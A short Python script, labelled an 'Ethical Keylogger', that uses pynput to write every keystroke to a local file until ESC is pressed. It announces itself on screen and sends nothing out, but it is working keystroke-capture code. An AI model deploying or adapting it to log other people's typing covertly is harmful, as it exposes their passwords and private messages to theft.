from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        return False

print("🔐 Ethical Keylogger Started")
print("Press ESC to stop logging")

with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogging stopped. Data saved to key_log.txt")
